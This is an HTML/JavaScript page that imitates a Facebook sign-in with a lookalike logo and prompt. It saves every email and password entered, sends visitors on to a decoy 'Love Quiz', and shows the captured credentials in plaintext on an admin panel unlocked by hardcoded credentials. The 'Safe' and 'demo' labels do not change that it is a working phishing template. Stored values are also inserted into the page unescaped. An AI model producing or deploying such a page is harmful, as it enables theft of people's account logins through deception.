<!doctype html>  
<html lang="en">  
<head>  
<meta charset="utf-8"/>  
<meta name="viewport" content="width=device-width,initial-scale=1"/>  
<title>Safe Admin Panel — Blue</title>  
<style>  
  :root{  
    --light-blue:#8fd3ff;  
    --blue:#1877F2;  
    --bg:#0b0b0c;  
    --card:#0f1720;  
    --muted:#9aa8b2;  
    --love1:#ffb6c1;  
    --love2:#ff5fa2;  
  }  
  *{box-sizing:border-box;font-family:Inter,Segoe UI,Arial,sans-serif;transition:all .3s ease;}  
  body{  
    margin:0;min-height:100vh;  
    display:flex;align-items:center;justify-content:center;  
    background:linear-gradient(180deg,#ffffff 0%, #e9f6ff 100%);  
    color:#111827;padding:28px;  
  }  
  .hidden{display:none!important;}  
  .fade{opacity:0;pointer-events:none;transform:scale(.98);}  
  .show{opacity:1;pointer-events:auto;transform:scale(1);}  
  
  .wrap{display:flex;gap:28px;align-items:flex-start;max-width:1000px;width:100%;justify-content:center;}  
  .left{width:340px;display:flex;align-items:center;justify-content:center;}  
  .logo{width:120px;height:120px;margin:0 auto 16px;display:block}  
  .card{  
    background:#ffffff;border-radius:12px;padding:18px;  
    box-shadow:0 6px 20px rgba(16,24,40,0.06);text-align:center;  
    width:100%;max-width:320px;animation:fadeIn .5s ease;  
  }  
  .card h2{margin:0 0 12px;font-size:20px;color:#0f172a}  
  input{width:100%;padding:10px;border-radius:8px;border:1px solid #d1d5db;margin:8px 0;font-size:14px}  
  button{width:100%;padding:10px;border-radius:8px;border:none;background:var(--blue);color:#fff;font-weight:700;cursor:pointer;margin-top:8px}  
  .small{font-size:13px;color:var(--muted);margin-top:8px}  
  
  /* ADMIN PANEL */  
  .right{flex:1;min-height:200px;display:flex;align-items:center;justify-content:center;}  
  .admin-wrap{  
    background:var(--bg);border-radius:12px;padding:18px;color:#dbeafe;  
    box-shadow:0 8px 30px rgba(2,6,23,0.6);  
    max-width:700px;width:100%;animation:fadeIn .6s ease;  
  }  
  .admin-header{display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;}  
  .badge{background:linear-gradient(90deg,var(--light-blue),var(--blue));  
    color:#021129;padding:8px 12px;border-radius:999px;font-weight:700}  
  .list{margin-top:14px;max-height:420px;overflow:auto;padding-right:6px}  
  .entry{display:flex;align-items:center;justify-content:space-between;  
    padding:12px;border-radius:10px;background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);  
    margin-bottom:10px;border:1px solid rgba(255,255,255,0.03)}  
  .meta{display:flex;flex-direction:column;gap:4px;text-align:left}  
  .meta .email{font-weight:700;color:#e6f7ff}  
  .meta .sub{font-size:13px;color:#9fb8cc}  
  .remove-btn{background:transparent;border:1px solid rgba(255,255,255,0.12);padding:8px 10px;border-radius:8px;color:#ffdcdc;cursor:pointer}  
  .clear-all{background:#111827;border-radius:8px;padding:8px 12px;border:none;color:var(--light-blue);font-weight:700;cursor:pointer}  
  .note{font-size:13px;color:#9fb8cc;margin-top:10px}  
  
  /* LOVE QUIZ */  
  #quizWrap{  
    width:100%;max-width:600px;padding:24px;border-radius:16px;  
    background:linear-gradient(135deg,var(--love1),var(--love2));  
    color:#fff;text-align:center;box-shadow:0 8px 25px rgba(255,105,180,0.3);  
    animation:fadeIn .6s ease;  
  }  
  #quizWrap h2{margin-bottom:16px;font-size:26px;}  
  .question{font-size:18px;margin-bottom:20px;}  
  .options button{  
    display:block;width:100%;margin:8px 0;padding:12px;border:none;  
    border-radius:8px;background:rgba(255,255,255,0.2);  
    color:#fff;font-weight:600;cursor:pointer;  
  }  
  .options button:hover{background:rgba(255,255,255,0.4);}  
  #nextBtn{background:#fff;color:var(--love2);font-weight:800;margin-top:14px;}  
  #result{font-size:22px;margin-top:20px;}  
  @keyframes fadeIn{from{opacity:0;transform:translateY(10px);}to{opacity:1;transform:translateY(0);}}  
</style>  
</head>  
<body>  
  
<div class="wrap">  
  <!-- LOGIN -->  
  <div class="left" id="loginContainer">  
    <div class="card show" id="loginCard">  
      <svg class="logo" viewBox="0 0 64 64"><circle cx="32" cy="36" r="26" fill="#1877F2"/><text x="32" y="47" text-anchor="middle" font-size="56" fill="#fff" font-weight="900" dominant-baseline="middle">f</text></svg>  
      <h2>Sign in</h2>  
      <input id="email" type="email" placeholder="Email"/>  
      <input id="pwd" type="password" placeholder="Password"/>  
      <button id="btnLogin">Login</button>  
      <div class="small"><strong>login</strong> <strong>your Facebook account</strong></div>  
    </div>  
  </div>  
  
  <!-- ADMIN PANEL -->  
  <div class="right">  
    <div class="admin-wrap hidden" id="adminWrap">  
      <div class="admin-header">  
        <div class="badge">Admin</div>  
        <div><b>Blue — Admin Panel</b><br><small style="color:#94c9e9">Saved login demo</small></div>  
        <div><button id="logoutBtn">Logout</button><button id="clearBtn" class="clear-all">Clear All</button></div>  
      </div>  
      <div class="list" id="listArea"><div style="color:#74a9c7;padding:12px 0">No saved logins yet.</div></div>  
      <div class="note">Passwords shown.</div>  
    </div>  
  
    <!-- LOVE QUIZ -->  
    <div id="quizWrap" class="hidden">  
      <h2>💖 Love Quiz 💖</h2>  
      <div id="quizBox">  
        <div class="question" id="question"></div>  
        <div class="options" id="options"></div>  
        <button id="nextBtn">Next</button>  
        <div id="result" class="hidden"></div>  
      </div>  
    </div>  
  </div>  
</div>  
  
<script>  
const ADMIN_USER='blue',ADMIN_PASS='hatdogq40';  
const STORAGE_KEY='demo_logins_safe_v1';  
const loginBtn=document.getElementById('btnLogin');  
const adminWrap=document.getElementById('adminWrap');  
const quizWrap=document.getElementById('quizWrap');  
const listArea=document.getElementById('listArea');  
const logoutBtn=document.getElementById('logoutBtn');  
const clearBtn=document.getElementById('clearBtn');  
const loginContainer=document.getElementById('loginContainer');  
  
function readStore(){try{return JSON.parse(localStorage.getItem(STORAGE_KEY))||[]}catch(e){return[]}}  
function writeStore(v){localStorage.setItem(STORAGE_KEY,JSON.stringify(v))}  
function genToken(l=8){const c='ABCDEFGHJKMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789';let t='';for(let i=0;i<l;i++)t+=c.charAt(Math.floor(Math.random()*c.length));return t;}  
function addRecord(email){const lower=email.trim().toLowerCase();if(!lower||lower===ADMIN_USER)return;const arr=readStore();arr.push({email:lower,password:document.getElementById('pwd').value,token:genToken(10),time:new Date().toLocaleString()});writeStore(arr);}  
function renderList(){const arr=readStore();listArea.innerHTML='';if(!arr.length){listArea.innerHTML='<div style="color:#74a9c7;padding:12px 0">No saved logins yet.</div>';return;}  
arr.slice().reverse().forEach((r,i)=>{const idx=arr.length-1-i;const el=document.createElement('div');el.className='entry';el.innerHTML=`<div class="meta"><div class="email">${r.email}</div><div class="sub">Password: ${r.password} · Token: ${r.token}</div><div class="sub" style="font-size:12px;color:#6aa6c8">${r.time}</div></div><button class="remove-btn" data-idx="${idx}">Remove</button>`;listArea.appendChild(el);});  
listArea.querySelectorAll('.remove-btn').forEach(b=>b.onclick=()=>{const arr=readStore();arr.splice(b.dataset.idx,1);writeStore(arr);renderList();});}  
clearBtn.onclick=()=>{if(confirm('Clear all?')){writeStore([]);renderList();}}  
logoutBtn.onclick=()=>{location.reload();}  
  
/* LOGIN FLOW */  
loginBtn.onclick=()=>{  
  const email=document.getElementById('email').value.trim();  
  const pwd=document.getElementById('pwd').value.trim();  
  if(!email||!pwd)return alert('Enter email and password');  
  const isAdmin=email.toLowerCase()===ADMIN_USER&&pwd===ADMIN_PASS;  
    
  document.getElementById('loginCard').classList.add('fade');  
  setTimeout(()=>loginContainer.classList.add('hidden'),400);  
    
  if(isAdmin){  
    adminWrap.classList.remove('hidden');  
    addRecord(email);renderList();  
  }else{  
    addRecord(email);  
    quizWrap.classList.remove('hidden');  
    startQuiz();  
  }  
};  
  
/* LOVE QUIZ QUESTIONS */  
const quizData=[  
 {q:"What do you value most in love?",o:["Trust","Fun","Loyalty","Adventure"],a:0},  
 {q:"Ideal date night?",o:["Movie marathon","Beach walk","Candle dinner","Gaming together"],a:2},  
 {q:"Pick a color of love:",o:["Red","Pink","Blue","Purple"],a:1},  
 {q:"When you miss someone you…",o:["Text them","Sleep","Listen to music","Scroll old chats"],a:3},  
 {q:"Love is…",o:["War","Game","Magic","Peace"],a:2},  
 {q:"How fast do you fall in love?",o:["Slow","Fast","Never","Depends"],a:3},  
 {q:"What song vibe you?",o:["Romantic","Sad","Chill","Hype"],a:0},  
 {q:"Favorite gift?",o:["Letters","Flowers","Food","Hugs"],a:3},  
 {q:"How do you show love?",o:["Words","Acts","Time","Gifts"],a:2},  
 {q:"Choose a heart:",o:["💖","💘","💞","❤️‍🔥"],a:3}  
];  
let current=0,score=0;  
const qEl=document.getElementById('question');  
const optEl=document.getElementById('options');  
const nextBtn=document.getElementById('nextBtn');  
const resEl=document.getElementById('result');  
  
function startQuiz(){current=0;score=0;resEl.classList.add('hidden');nextBtn.innerText='Next';showQ();}  
function showQ(){const d=quizData[current];qEl.textContent=d.q;optEl.innerHTML='';d.o.forEach((opt,i)=>{const b=document.createElement('button');b.textContent=opt;b.onclick=()=>{if(i===d.a)score++;current++;current<quizData.length?showQ():showResult();};optEl.appendChild(b);});}  
function showResult(){qEl.textContent='Result 💌';optEl.innerHTML='';nextBtn.classList.add('hidden');const percent=Math.round((score/quizData.length)*100);let msg="";if(percent>80)msg="You're a true romantic!";else if(percent>50)msg="You're sweet and thoughtful.";else msg="Love takes time — you'll get there 💕";resEl.textContent=`Your love score: ${percent}% — ${msg}`;resEl.classList.remove('hidden');}  
</script>  
</body>  
</html>
